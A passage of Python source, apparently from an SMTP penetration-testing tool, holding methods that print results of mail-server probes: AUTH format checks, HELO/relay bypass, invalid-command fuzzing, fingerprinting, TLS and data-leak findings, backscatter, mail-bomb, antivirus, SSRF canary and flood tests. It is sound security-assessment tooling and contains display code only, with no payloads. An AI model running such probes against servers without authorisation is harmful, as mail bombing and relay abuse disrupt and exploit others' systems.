        """PTL-SVC-SMTP-AUTH-FORMAT: text output for AUTH LOGIN identity-shape probes."""
        info_icon = get_colored_text("[i]", color="INFO")
        plus_icon = get_colored_text("[+]", color="INFO")
        if (err := self.results.auth_format_error) is not None:
            self.ptprint(f"    {info_icon} AUTH format probe failed: {err}", Out.TEXT)
            return
        af = self.results.auth_format
        if af is None:
            return
        self.ptprint(f"    {plus_icon} AUTH Analysis ({af.method_tested})", Out.TEXT)
        if af.challenge_decoded is not None:
            self.ptprint(f"    {info_icon} AUTH LOGIN challenge (decoded): {af.challenge_decoded!r}", Out.TEXT)
        if af.challenge_hint:
            self.ptprint(f"    {info_icon} Challenge heuristic: {af.challenge_hint}", Out.TEXT)
        self.ptprint(f"    {info_icon} Auth Format Probe:", Out.TEXT)
        if af.target_domain_used:
            self.ptprint(f"        {info_icon} Target domain used: {af.target_domain_used}", Out.TEXT)
        else:
            self.ptprint(f"        {info_icon} Target domain used: (none — probe B skipped)", Out.TEXT)
        if af.target_domain_analyst_note:
            self.ptprint(f"        {info_icon} {af.target_domain_analyst_note}", Out.TEXT)
        if self.args.debug:
            if af.target_domain_source == "ehlo_last2" and af.target_domain_ehlo_hostname and af.target_domain_used:
                self.ptdebug(
                    f"AUTH-FORMAT: scan target is IP; EHLO hostname {af.target_domain_ehlo_hostname!r} "
                    f"→ derived domain {af.target_domain_used!r} (last 2 labels, no PSL)",
                    Out.INFO,
                )
            elif af.target_domain_source == "scan_last2" and af.target_domain_scan_hostname and af.target_domain_used:
                self.ptdebug(
                    f"AUTH-FORMAT: target domain from scan target {af.target_domain_scan_hostname!r} "
                    f"→ {af.target_domain_used!r} (last 2 labels, no PSL)",
                    Out.INFO,
                )
            elif af.target_domain_source == "none":
                self.ptdebug(
                    "AUTH-FORMAT: no derived domain for probe B (see analyst note above)",
                    Out.INFO,
                )
        for r in af.rows:
            if r.skipped:
                self.ptprint(f"        {info_icon} {r.label}: skipped ({r.skip_reason or 'n/a'})", Out.TEXT)
            elif r.password_phase:
                tail = f"final reply {r.code_after_password}" if r.code_after_password is not None else "password phase"
                self.ptprint(
                    f"        {info_icon} {r.label}: accepted → password phase ({tail})",
                    Out.TEXT,
                )
            else:
                rep = (r.reply_after_identity or "").replace("\r\n", " ").strip()
                if len(rep) > 140:
                    rep = rep[:137] + "..."
                self.ptprint(
                    f"        {info_icon} {r.label}: rejected at username ({r.code_after_identity}) {rep}".rstrip(),
                    Out.TEXT,
                )
        self.ptprint(f"    {info_icon} Auth Identity Format: {af.conclusion}", Out.TEXT)
        if af.conclusion_id == "flexible_all_formats":
            ch_tail = ""
            hint_note = af.challenge_hint
            if hint_note and "ambiguous" in hint_note.lower():
                hint_note = "format ambiguous"
            if af.challenge_decoded is not None and hint_note:
                ch_tail = f" Challenge hint: {af.challenge_decoded!r} — {hint_note}."
            elif af.challenge_decoded is not None:
                ch_tail = f" Challenge hint: {af.challenge_decoded!r}."
            elif hint_note:
                ch_tail = f" Challenge hint: {hint_note}."
            self.ptprint(
                f"    {info_icon} Note: All probes that ran reached password phase — server may be masking "
                f"expected format (catch-all behavior).{ch_tail}",
                Out.TEXT,
            )
        if af.netbios_domain_used:
            self.ptprint(f"    {info_icon} NTLM-derived DOMAIN for NetBIOS probe: {af.netbios_domain_used}", Out.TEXT)

    def _stream_helo_validation_result(self) -> None:
        if (err := self.results.helo_validation_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} HELO validation test failed: {err}", Out.TEXT)
            return
        hv = self.results.helo_validation
        if hv is None:
            return
        if hv.indeterminate:
            icon = get_colored_text("[*]", color="INFO")
            self.ptprint(f"    {icon} Indeterminate: {hv.detail or 'Baseline failed'}", Out.TEXT)
            return
        if hv.vulnerable:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} VULNERABLE: {hv.detail}", Out.TEXT)
        elif hv.weak_config:
            icon = get_colored_text("[!]", color="WARNING")
            self.ptprint(f"    {icon} WEAK CONFIG: {hv.detail}", Out.TEXT)
        elif hv.ehlo_bypass:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} EHLO bypass: {hv.detail}", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} SECURE: {hv.detail}", Out.TEXT)
        if hv.accepted_vectors or hv.rejected_vectors:
            self.ptprint(f"        Accepted: {hv.accepted_vectors}", Out.TEXT)
            self.ptprint(f"        Rejected: {hv.rejected_vectors}", Out.TEXT)

    def _stream_inv_comm_result(self) -> None:
        """Terminal: all probe lines use INFO [i] icon only (-iv); severity stays in the text."""
        info_icon = get_colored_text("[i]", color="INFO")
        if (err := self.results.inv_comm_error) is not None:
            self.ptprint(f"    {info_icon} Invalid commands test failed: {err}", Out.TEXT)
            return
        ic = self.results.inv_comm
        if ic is None:
            return
        if ic.indeterminate:
            self.ptprint(f"    {info_icon} Indeterminate: {ic.detail or 'Could not complete'}", Out.TEXT)
            return
        if not self.use_json and ic.tests:
            for t in ic.tests:
                if t.vulnerable:
                    vt = getattr(t, "vuln_type", None) or "crash"
                    time_str = f" ({t.response_time_sec:.2f}s)" if getattr(t, "response_time_sec", None) is not None else ""
                    if vt == "acceptance":
                        reply_part = (t.reply or "2xx").split("\n")[0].strip()
                        msg = f"VULNERABLE (ACCEPTANCE): Server accepted invalid input '{t.command_display}' ({reply_part}){time_str}"
                    elif vt == "timeout":
                        msg = f"VULNERABLE (TIMEOUT): No response (timeout) for '{t.command_display}'{time_str}"
                    else:
                        msg = f"VULNERABLE (CRASH): Server stopped responding after '{t.command_display}'{time_str}"
                    self.ptprint(f"    {info_icon} {msg}", Out.TEXT)
                else:
                    status_str = str(t.status) if t.status is not None else "connection lost"
                    display_reply = self._inv_comm_reply_for_display(t.status, t.reply)
                    short_reply = display_reply or ""
                    time_str = f" ({t.response_time_sec:.2f}s)" if getattr(t, "response_time_sec", None) is not None else ""
                    self.ptprint(
                        f"    {info_icon} {t.command_display}: {status_str} {short_reply}{time_str}",
                        Out.TEXT,
                    )
                if t.info_leak:
                    self.ptprint(f"        {info_icon} Verbose error (possible info leak)", Out.TEXT)
                if getattr(t, "slow_response", False):
                    if getattr(ic, "tarpitting_detected", False):
                        self.ptprint(f"        {info_icon} Tarpitting detected (constant delay - likely smtpd_error_sleep_time)", Out.TEXT)
                    else:
                        self.ptprint(f"        {info_icon} Slow response (possible ReDoS in parser)", Out.TEXT)
        if getattr(ic, "tarpitting_detected", False):
            self.ptprint(f"    {info_icon} INFO: Tarpitting detected (constant delay on invalid commands - likely smtpd_error_sleep_time, not parser bug)", Out.TEXT)
        if ic.vulnerable:
            pass  # Vulnerabilities already shown per-test above
        elif ic.weakness:
            self.ptprint(f"    {info_icon} WEAKNESS: {ic.detail}", Out.TEXT)
        else:
            self.ptprint(f"    {info_icon} {ic.detail}", Out.TEXT)

    def _stream_helo_only_result(self) -> None:
        if (err := self.results.helo_only_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} HELO-only test failed: {err}", Out.TEXT)
            return
        ho = self.results.helo_only
        if ho is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")

        def _strip_status_prefix(reply: str | None) -> str:
            """Strip leading '250 ' or '250-' from reply for display."""
            if not reply:
                return ""
            r = reply.strip()
            if r.startswith("250 "):
                return r[4:].strip()
            if r.startswith("250-"):
                return r[4:].strip()
            return r

        if not self.use_json:
            self.ptprint(f"    {info_icon} Connection: {ho.connection_type}", Out.TEXT)
            helo_first = (ho.helo_reply or "").replace("\r", "\n").split("\n")[0].strip()
            self.ptprint(f"    {info_icon} HELO test.local: {ho.helo_status} {_strip_status_prefix(helo_first)}", Out.TEXT)
            ehlo_first = (ho.ehlo_reply or "").replace("\r", "\n").split("\n")[0].strip()
            self.ptprint(f"    {info_icon} EHLO test.local: {ho.ehlo_status} {_strip_status_prefix(ehlo_first)}", Out.TEXT)
            if ho.extensions:
                for ext in ho.extensions:
                    self.ptprint(f"        {ext}", Out.TEXT)
        if ho.indeterminate:
            self.ptprint(f"    {info_icon} Indeterminate: {ho.detail or 'Could not complete'}", Out.TEXT)
        elif ho.vulnerable:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} VULNERABLE: {ho.detail}", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} {ho.detail}", Out.TEXT)

    def _stream_helo_bypass_result(self) -> None:
        if (err := self.results.helo_bypass_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} HELO bypass test failed: {err}", Out.TEXT)
            return
        hb = self.results.helo_bypass
        if hb is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        if not self.use_json:
            if hb.accepts_invalid_format:
                self.ptprint(f"    {info_icon} Info: Accepts loose EHLO formats: {', '.join(hb.accepts_invalid_format)}", Out.TEXT)
            if hb.tarpitting_detected:
                self.ptprint(f"    {info_icon} Tarpitting detected for: {', '.join(hb.tarpitting_detected)}", Out.TEXT)
        if hb.indeterminate:
            self.ptprint(f"    {info_icon} Indeterminate: {hb.detail or 'Could not complete'}", Out.TEXT)
        elif hb.vulnerable:
            icon = get_colored_text("[✗]", color="VULN")
            bypass_ehlo = tuple(hb.submission_bypass_ehlo) + tuple(hb.relay_bypass_ehlo)
            self.ptprint(f"    {icon} CRITICAL: Relay/Submission bypass with EHLO: {', '.join(bypass_ehlo)}", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} No relay bypass detected (Authorization required)", Out.TEXT)

    def _stream_identify_result(self) -> None:
        if (err := self.results.identify_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Server identification failed: {err}", Out.TEXT)
            return
        r = self.results.identify
        if r is None:
            return
        ok_icon = get_colored_text("[✓]", color="NOTVULN")
        warn_icon = get_colored_text("[!]", color="WARNING")
        id_detail_icon = get_colored_text("[i]", color="INFO")
        if not self.use_json:
            banner_display = (r.banner or "").replace("\r", "").strip()
            if r.hidden_banner and banner_display:
                self.ptprint(f"    {get_colored_text('[*] Banner:', color='INFO')} {banner_display} (Hidden)", Out.TEXT)
            elif r.banner:
                self.ptprint(f"    {get_colored_text('[*] Banner:', color='INFO')} {banner_display}", Out.TEXT)
            if r.hidden_banner or not r.scoring_matrix:
                self.ptprint(f"    {get_colored_text('[*] Analyzing behavioral patterns...', color='INFO')}", Out.TEXT)
            # Behavioral Analysis section (v1.0.5) - Evidence-based: show matched/missing verbs
            if getattr(r, "behavioral_profile_product", None) or getattr(r, "behavioral_profile_detail", None) or getattr(r, "behavioral_discrepancies", None) or getattr(r, "latency_avg_ms", None) is not None or getattr(r, "cert_software_context", None):
                self.ptprint(f"    {get_colored_text('[*] Behavioral Analysis', color='INFO')}", Out.TEXT)
                if getattr(r, "behavioral_profile_product", None) and getattr(r, "behavioral_profile_sim", 0) > 0:
                    self.ptprint(
                        f"        {id_detail_icon} EHLO profile: {r.behavioral_profile_sim}% match "
                        f"'{r.behavioral_profile_product}' "
                        f"{f'({r.behavioral_profile_detail})' if getattr(r, 'behavioral_profile_detail', None) else ''}",
                        Out.TEXT,
                    )
                    # Evidence-based: matched and missing verbs
                    matched = getattr(r, "behavioral_matched_verbs", None) or ()
                    missing = getattr(r, "behavioral_missing_verbs", None) or ()
                    product_name = r.behavioral_profile_product or ""
                    signature_label = (
                        f" ({product_name} signature)" if product_name.strip() else " (EHLO profile match)"
                    )
                    if matched:
                        self.ptprint(f"        {id_detail_icon} Matched verbs: {', '.join(matched)}{signature_label}", Out.TEXT)
                    if missing:
                        parts = []
                        for v in missing:
                            # Case-insensitive lookup: verbs normalized to uppercase (server may return "auth" vs "AUTH")
                            hint = PROFILE_MISSING_HINTS.get((product_name, (v or "").upper()))
                            parts.append(f"{v} ({hint})" if hint else v)
                        self.ptprint(f"        {id_detail_icon} Missing verbs: {', '.join(parts)}", Out.TEXT)
                if getattr(r, "unknown_cmd_response", None) and getattr(self.args, "id_aggressive", False):
                    self.ptprint(f"        Unknown command: {r.unknown_cmd_response.strip()}", Out.TEXT)
                if getattr(r, "latency_avg_ms", None) is not None:
                    jitter = getattr(r, "latency_jitter_ms", None)
                    jitter_str = f", jitter {jitter:.0f} ms" if jitter is not None and jitter > 0 else ""
                    proxy_hint = " (possible proxy/filter)" if jitter and jitter > 50 else " (direct MTA)"
                    self.ptprint(
                        f"        {id_detail_icon} Latency: avg {r.latency_avg_ms:.0f} ms{jitter_str}{proxy_hint}",
                        Out.TEXT,
                    )
                if getattr(r, "cert_software_context", None):
                    self.ptprint(f"        TLS cert context: {r.cert_software_context}", Out.TEXT)
                for d in getattr(r, "behavioral_discrepancies", None) or []:
                    self.ptprint(f"        {warn_icon} {d}", Out.TEXT)
            has_tls_cert = bool(
                r.tls_cert_subject or r.tls_cert_issuer or (r.tls_cert_san and r.tls_cert_san)
            )
            bad_tls_icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {get_colored_text('[*] TLS Certificate Info:', color='INFO')}", Out.TEXT)
            if has_tls_cert:
                if r.tls_cert_subject:
                    self.ptprint(f"        {id_detail_icon} Subject: {r.tls_cert_subject}", Out.TEXT)
                if r.tls_cert_san:
                    self.ptprint(f"        {id_detail_icon} SAN: {', '.join(r.tls_cert_san)}", Out.TEXT)
                if r.tls_cert_issuer:
                    self.ptprint(f"        {id_detail_icon} Issuer: {r.tls_cert_issuer}", Out.TEXT)
                if r.tls_cert_self_signed:
                    ss_icon = get_colored_text("[✗]", color="VULN")
                    self.ptprint(f"        {ss_icon} Self-signed: yes", Out.TEXT)
                else:
                    self.ptprint(f"        {ok_icon} Self-signed: no", Out.TEXT)
                if getattr(r, "tls_policy", None) and r.tls_policy != "n/a":
                    self.ptprint(f"        TLS policy: {r.tls_policy}", Out.TEXT)
                if getattr(r, "tls_downgrade_probed", False):
                    downgrade = getattr(r, "tls_downgrade_findings", None) or []
                    if downgrade:
                        for w in downgrade:
                            self.ptprint(f"        {warn_icon} TLS downgrade: {w}", Out.TEXT)
                    else:
                        self.ptprint(f"        {ok_icon} TLS downgrade: TLS 1.0/1.1 rejected (Good)", Out.TEXT)
                if getattr(r, "cert_domain_match", False):
                    self.ptprint(f"        {ok_icon} Cert domain match: SAN aligns with target", Out.TEXT)
                for w in getattr(r, "tls_cert_warnings", None) or []:
                    self.ptprint(f"        {warn_icon} {w}", Out.TEXT)
                for w in getattr(r, "tls_cipher_warnings", None) or []:
                    self.ptprint(f"        {warn_icon} {w}", Out.TEXT)
                if getattr(r, "os_hint", None):
                    self.ptprint(f"        {id_detail_icon} OS hint: {r.os_hint}", Out.TEXT)
            else:
                transport_tls = getattr(r, "transport_tls", False)
                starttls_adv = getattr(r, "starttls_advertised", False)
                tls_up_fail = getattr(r, "tls_upgrade_failed", False)
                dbg_tail = (
                    f"; {r.tls_upgrade_error}"
                    if self.args.debug and getattr(r, "tls_upgrade_error", None)
                    else "; try -vv or --verbose"
                )
                if tls_up_fail:
                    msg = (
                        "TLS certificate could not be extracted (STARTTLS upgrade or cert parse failed"
                        + dbg_tail
                        + ")"
                    )
                    self.ptprint(f"        {bad_tls_icon} {msg}", Out.TEXT)
                elif transport_tls:
                    msg = (
                        "TLS certificate could not be extracted (TLS session; cert parse failed"
                        + dbg_tail
                        + ")"
                    )
                    self.ptprint(f"        {bad_tls_icon} {msg}", Out.TEXT)
                elif starttls_adv:
                    self.ptprint(
                        f"        {bad_tls_icon} TLS certificate could not be extracted",
                        Out.TEXT,
                    )
                else:
                    self.ptprint(f"        {bad_tls_icon} STARTTLS not advertised", Out.TEXT)
                if getattr(r, "tls_downgrade_probed", False):
                    downgrade = getattr(r, "tls_downgrade_findings", None) or []
                    if downgrade:
                        for w in downgrade:
                            self.ptprint(f"        {warn_icon} TLS downgrade: {w}", Out.TEXT)
                    else:
                        self.ptprint(f"        {ok_icon} TLS downgrade: TLS 1.0/1.1 rejected (Good)", Out.TEXT)
                if getattr(r, "os_hint", None):
                    self.ptprint(f"        {id_detail_icon} OS hint: {r.os_hint}", Out.TEXT)
            if r.scoring_matrix:
                self.ptprint(f"    {get_colored_text('[*] Scoring Matrix', color='INFO')}", Out.TEXT)
                for s in r.scoring_matrix:
                    pts_fmt = f"{s.points:+d}%"
                    self.ptprint(
                        f"        {id_detail_icon} {s.method}: {pts_fmt} {f'({s.detail})' if s.detail else ''}",
                        Out.TEXT,
                    )
            self.ptprint(f"    {get_colored_text('[*] Identification Result', color='INFO')}", Out.TEXT)
            self.ptprint(f"        Product:     {r.product or 'Unknown'}", Out.TEXT)
            _bh = getattr(r, "behavioral_hint", None)
            if _bh and not str(_bh).rstrip().endswith("(0%)"):
                self.ptprint(f"        Behavioral hint: {_bh}", Out.TEXT)
            self.ptprint(f"        Version:     {r.version or '—'}", Out.TEXT)
            self.ptprint(f"        Confidence: {r.confidence_pct}% ({r.confidence_label})", Out.TEXT)
            if r.cpe:
                self.ptprint(f"        CPE:        {r.cpe}", Out.TEXT)
            if getattr(r, "discrepancy_detected", False) and getattr(
                r, "discrepancy_banner_product", None
            ) and getattr(r, "discrepancy_behavior_product", None):
                self.ptprint(
                    f"        {id_detail_icon} Discrepancy: Banner claims '{r.discrepancy_banner_product}', "
                    f"behavior matches '{r.discrepancy_behavior_product}'",
                    Out.TEXT,
                )
            elif r.anomalous_identity:
                self.ptprint(
                    f"        {id_detail_icon} Discrepancy: Banner claims '{r.banner_claims}', "
                    f"behavior matches '{r.behavior_matches}'",
                    Out.TEXT,
                )
            if r.integrity_note:
                self.ptprint(f"        {id_detail_icon} Integrity: {r.integrity_note}", Out.TEXT)
            if r.recommendation:
                self.ptprint(f"        {id_detail_icon} Recommendation: {r.recommendation}", Out.TEXT)
            leaks = getattr(r, "data_leakage_findings", None) or ()
            if leaks:
                self.ptprint(f"    {get_colored_text('[+] Data Leakage / Privacy', color='INFO')}", Out.TEXT)
                for leak in leaks:
                    src = ", ".join(leak.sources)
                    _lk = getattr(leak, "kind", "email")
                    if _lk == "internal_hostname":
                        if leak.risk == "high":
                            self.ptprint(
                                f"        {warn_icon} Information exposure: Internal infrastructure naming leaked in "
                                f"TLS Certificate (Non-routable domain).",
                                Out.TEXT,
                            )
                            self.ptprint(
                                f"        {warn_icon} Extracted: {leak.email} [High Risk]",
                                Out.TEXT,
                            )
                        else:
                            self.ptprint(
                                f"        {warn_icon} Information exposure: Internal infrastructure naming leaked in "
                                f"TLS Certificate (Non-routable domain).",
                                Out.TEXT,
                            )
                            self.ptprint(
                                f"        {warn_icon} Extracted: {leak.email} [Medium Risk]",
                                Out.TEXT,
                            )
                        continue
                    if leak.risk == "high":
                        self.ptprint(
                            f"        {warn_icon} Sensitive info: E-mail address found in {src} "
                            f"(domain aligns with scan target).",
                            Out.TEXT,
                        )
                        self.ptprint(f"        {warn_icon} Extracted: {leak.email} [High Risk]", Out.TEXT)
                    elif leak.risk == "medium":
                        self.ptprint(
                            f"        {warn_icon} Information exposure: Routable address in {src} "
                            f"(domain does not match scan target).",
                            Out.TEXT,
                        )
                        self.ptprint(f"        {warn_icon} Extracted: {leak.email} [Medium Risk]", Out.TEXT)
                    else:
                        self.ptprint(
                            f"        {id_detail_icon} Information exposure: Generic, noreply, or non-routable "
                            f"contact in {src}.",
                            Out.TEXT,
                        )
                        self.ptprint(
                            f"        {id_detail_icon} Extracted: {leak.email} [Low Risk]",
                            Out.TEXT,
                        )
                email_leaks = [x for x in leaks if getattr(x, "kind", "email") == "email"]
                if email_leaks:
                    if any(x.risk == "high" for x in email_leaks):
                        self.ptprint(
                            f"        {id_detail_icon} Risk: Address domain matches the scanned host — strong signal for "
                            f"organizational exposure; targeted phishing or brute-force against admin mailboxes is more "
                            f"credible.",
                            Out.TEXT,
                        )
                    elif any(x.risk == "medium" for x in email_leaks):
                        self.ptprint(
                            f"        {id_detail_icon} Risk: Routable address leaked but not aligned with scan target — "
                            f"still information exposure (e.g. vendor or third-party identity in cert).",
                            Out.TEXT,
                        )
                    else:
                        self.ptprint(
                            f"        {id_detail_icon} Risk: Little direct phishing value for noreply / @localhost / "
                            f"reserved domains, but may still indicate default or placeholder TLS/DN setup.",
                            Out.TEXT,
                        )
                if any(
                    getattr(x, "kind", "email") == "internal_hostname" and x.risk in ("medium", "high")
                    for x in leaks
                ):
                    self.ptprint(
                        f"        {id_detail_icon} Risk: Exposure of internal hostnames aids in network reconnaissance "
                        f"and targeted internal attacks.",
                        Out.TEXT,
                    )

    def _stream_bounce_replay_result(self) -> None:
        if (err := self.results.bounce_replay_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Bounce replay test failed: {err}", Out.TEXT)
            return
        br = self.results.bounce_replay
        if br is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        warn_icon = get_colored_text("[!]", color="WARNING")
        if not self.use_json and br.smtp_trace:
            for line in br.smtp_trace:
                self.ptprint(f"    {info_icon} {line}", Out.TEXT)
        if br.tarpitting_or_timeout:
            self.ptprint(f"    {warn_icon} Timeout (30s) - possible greylisting or tarpitting", Out.TEXT)
        if br.indeterminate:
            self.ptprint(f"    {info_icon} Indeterminate: {br.detail or 'Could not complete'}", Out.TEXT)
        elif br.message_accepted or getattr(br, "message_accepted_return_path", False):
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} POTENTIALLY VULNERABLE", Out.TEXT)
            self.ptprint(
                "    Server accepted DATA for a non-deliverable RCPT (high backscatter risk).",
                Out.TEXT,
            )
            self.ptprint(f"    Check {br.bounce_addr} for NDR/bounce within 2–5 minutes.", Out.TEXT)
            if br.test_id:
                self.ptprint(f"    Probe 1 test ID: {br.test_id} (X-PT-Test-ID)", Out.TEXT)
            if getattr(br, "message_accepted_return_path", False) and getattr(br, "test_id_return_path", ""):
                self.ptprint(f"    Probe 2 (Return-Path) test ID: {br.test_id_return_path}", Out.TEXT)
        elif br.rcpt_rejected_in_session:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} NOT VULNERABLE: RCPT rejected in session – no bounce expected", Out.TEXT)
        else:
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} {br.detail or 'Test completed'}", Out.TEXT)

    def _stream_mail_bomb_result(self) -> None:
        if (err := self.results.mail_bomb_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Mail bomb test failed: {err}", Out.TEXT)
            return
        mb = self.results.mail_bomb
        if mb is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        pmd = getattr(mb, "per_message_delivered", ()) or ()
        progress_bar = ""
        if pmd and not self.use_json:
            progress_bar = "".join(
                get_colored_text("█", "NOTVULN" if ok else "VULN") for ok in pmd
            )
        live_done = getattr(self, "_mail_bomb_live_progress_completed", False)

        def _bomb_stats_lines() -> None:
            if mb.detail:
                self.ptprint(f"    {mb.detail}", Out.TEXT)
            self.ptprint(
                f"    sent={mb.sent} delivered={mb.delivered} "
                f"rate_limited={mb.rate_limited} blocked={mb.blocked}",
                Out.TEXT,
            )
            if mb.last_error:
                type_hint = f" [{mb.last_error_type}]" if mb.last_error_type else ""
                self.ptprint(f"    Last connection error{type_hint}: {mb.last_error}", Out.TEXT)
            if mb.avg_rtt_ms is not None:
                self.ptprint(f"    Avg response time: {mb.avg_rtt_ms:.0f} ms", Out.TEXT)

        if mb.indeterminate:
            if progress_bar and not live_done:
                self.ptprint(f"    {info_icon} Progress: {progress_bar}", Out.TEXT)
            self.ptprint(f"    {info_icon} Indeterminate: {mb.detail or 'Could not complete'}", Out.TEXT)
            return
        if progress_bar and not live_done:
            self.ptprint(f"    {info_icon} Progress: {progress_bar}", Out.TEXT)
        if mb.vulnerable:
            _bomb_stats_lines()
            self.ptprint(f"    Server accepted large volume without rate limiting.", Out.TEXT)
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} VULNERABLE", Out.TEXT)
        elif mb.partial_protection:
            _bomb_stats_lines()
            warn_icon = get_colored_text("[!]", color="WARNING")
            self.ptprint(f"    {warn_icon} PARTIAL PROTECTION", Out.TEXT)
        else:
            _bomb_stats_lines()
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} NOT VULNERABLE", Out.TEXT)

    def _stream_antivirus_result(self) -> None:
        if (err := self.results.antivirus_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} Antivirus test failed: {err}", Out.TEXT)
            return
        av = self.results.antivirus
        if av is None:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        if not self.use_json:
            for cat in av.categories:
                self.ptprint(f"    {info_icon} {cat.category}: {cat.detail or ''}", Out.TEXT)
                for line in cat.smtp_trace[-10:]:
                    self.ptprint(f"        {line}", Out.TEXT)

        if self.use_json:
            if av.indeterminate:
                self.ptprint(f"    {info_icon} Indeterminate: {av.detail or 'Could not complete'}", Out.TEXT)
            elif av.vulnerable:
                icon = get_colored_text("[✗]", color="VULN")
                self.ptprint(f"    {icon} VULNERABLE", Out.TEXT)
                self.ptprint(f"    {av.detail}", Out.TEXT)
                self.ptprint(f"    Risky content was accepted at MTA.", Out.TEXT)
            elif av.partial_protection:
                warn_icon = get_colored_text("[!]", color="WARNING")
                self.ptprint(f"    {warn_icon} PARTIAL PROTECTION", Out.TEXT)
                self.ptprint(f"    {av.detail}", Out.TEXT)
            else:
                icon = get_colored_text("[✓]", color="NOTVULN")
                self.ptprint(f"    {icon} NOT VULNERABLE", Out.TEXT)
                self.ptprint(f"    {av.detail}", Out.TEXT)
            return

        if av.indeterminate:
            self.ptprint(f"    {info_icon} Summary", Out.TEXT)
            self.ptprint(f"        {av.detail or 'Could not complete'}", Out.TEXT)
            self.ptprint(f"        Elapsed: {av.elapsed_sec:.1f} s", Out.TEXT)
        elif av.vulnerable:
            self.ptprint(f"    {info_icon} Summary", Out.TEXT)
            self.ptprint(f"        {av.detail}", Out.TEXT)
            self.ptprint(f"        Risky content was accepted at MTA.", Out.TEXT)
            self.ptprint(f"        Elapsed: {av.elapsed_sec:.1f} s", Out.TEXT)
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} VULNERABLE", Out.TEXT)
        elif av.partial_protection:
            self.ptprint(f"    {info_icon} Summary", Out.TEXT)
            self.ptprint(f"        {av.detail}", Out.TEXT)
            self.ptprint(f"        Elapsed: {av.elapsed_sec:.1f} s", Out.TEXT)
            warn_icon = get_colored_text("[!]", color="WARNING")
            self.ptprint(f"    {warn_icon} PARTIAL PROTECTION", Out.TEXT)
        else:
            self.ptprint(f"    {info_icon} Summary", Out.TEXT)
            self.ptprint(f"        {av.detail}", Out.TEXT)
            self.ptprint(f"        Elapsed: {av.elapsed_sec:.1f} s", Out.TEXT)
            icon = get_colored_text("[✓]", color="NOTVULN")
            self.ptprint(f"    {icon} NOT VULNERABLE", Out.TEXT)

    def _stream_ssrf_result(self) -> None:
        if (err := self.results.ssrf_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} SSRF test failed: {err}", Out.TEXT)
            return
        sr = self.results.ssrf
        if sr is None:
            return
        if self.use_json:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        manual_icon = get_colored_text("[?]", color="WARNING")
        if sr.canary_url:
            self.ptprint(f"    {info_icon} Canary URL: {sr.canary_url}", Out.TEXT)
        for v in sr.variants:
            self.ptprint(
                f"    {info_icon} {v.variant}: {v.accepted} accepted, {v.rejected} rejected, {v.error} error",
                Out.TEXT,
            )
            for line in v.smtp_trace[-10:]:
                self.ptprint(f"        {line}", Out.TEXT)
        self.ptprint(f"    {info_icon} Summary", Out.TEXT)
        if sr.detail:
            self.ptprint(f"        {sr.detail}", Out.TEXT)
        for para in (sr.verification_instructions or "").split("\n"):
            p = para.strip()
            if p:
                self.ptprint(f"        {p}", Out.TEXT)
        self.ptprint(f"        Elapsed: {sr.elapsed_sec:.1f} s", Out.TEXT)
        self.ptprint(
            f"    {manual_icon} MANUAL VERIFICATION REQUIRED — check canary for HTTP callbacks from the MTA",
            Out.TEXT,
        )

    def _stream_flood_result(self) -> None:
        if (err := self.results.flood_error) is not None:
            icon = get_colored_text("[✗]", color="VULN")
            self.ptprint(f"    {icon} FLOOD test failed: {err}", Out.TEXT)
            return
        fr = self.results.flood
        if fr is None:
            return
        if self.use_json:
            return
        info_icon = get_colored_text("[*]", color="INFO")
        size_lines = [x for x in fr.smtp_trace if x.startswith("SIZE_")]
        queue_lines = [x for x in fr.smtp_trace if x.startswith("QUEUE_")]
        other_lines = [
            x
            for x in fr.smtp_trace
            if not (x.startswith("SIZE_") or x.startswith("QUEUE_"))
        ]

        if fr.indeterminate:
            if other_lines:
                self.ptprint(f"    {info_icon} Connection / setup", Out.TEXT)
                for line in other_lines:
                    self.ptprint(f"        {line}", Out.TEXT)
            self.ptprint(f"    {info_icon} Summary", Out.TEXT)
            self.ptprint(f"        {fr.detail or 'Could not complete'}", Out.TEXT)
            self.ptprint(f"        Elapsed: {fr.elapsed_sec:.1f} s", Out.TEXT)
            return

        if fr.size_advertised:
            lim = fr.size_limit_bytes
            sz_desc = f"advertised ({lim} B limit)" if lim is not None else "advertised"
        else:
            sz_desc = "not advertised"
        enf = fr.size_enforced
        enf_s = "n/a" if enf is None else ("yes" if enf else "no")
        self.ptprint(
            f"    {info_icon} SIZE extension: {sz_desc}; enforced: {enf_s}",
            Out.TEXT,
        )
        for line in size_lines:
            self.ptprint(f"        {line}", Out.TEXT)

        if fr.queue_attempts > 0:
            self.ptprint(
                f"    {info_icon} Attempts: {fr.queue_attempts} "
